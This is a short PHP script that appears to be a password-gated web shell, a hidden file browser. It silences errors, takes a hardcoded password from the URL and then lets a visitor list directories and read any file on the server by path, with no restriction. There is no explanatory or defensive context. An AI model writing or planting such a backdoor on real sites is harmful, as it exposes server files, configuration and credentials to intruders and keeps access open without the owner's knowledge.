<?php
session_start();
set_time_limit(0);
error_reporting(0);

$auth_password = "securepaswd";
$hidden_mode = false;

// Simple authentication
if (isset($_GET['pass']) && $_GET['pass'] == $auth_password) {
    $_SESSION['authenticated'] = true;
}

if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
    echo '<form method="get"><input type="password" name="pass" placeholder="Enter password"><input type="submit" value="Login"></form>';
    exit;
}

function list_directory($dir) {
    $files = scandir($dir);
    echo "<h2>Directory: " . htmlspecialchars($dir) . "</h2>";
    echo "<ul>";
    foreach ($files as $file) {
        if ($file !== '.' && $file !== '..') {
            echo "<li><a href='?view=" . urlencode($dir . '/' . $file) . "'>" . htmlspecialchars($file) . "</a></li>";
        }
    }
    echo "</ul>";
}

if (isset($_GET['view'])) {
    $file = realpath($_GET['view']);
    if (is_file($file)) {
        echo "<h2>Viewing File: " . htmlspecialchars(basename($file)) . "</h2>";
        echo "<pre>" . htmlspecialchars(file_get_contents($file)) . "</pre>";
    } else {
        echo "<p>Invalid file.</p>";
    }
} else {
    list_directory(getcwd());
}
?>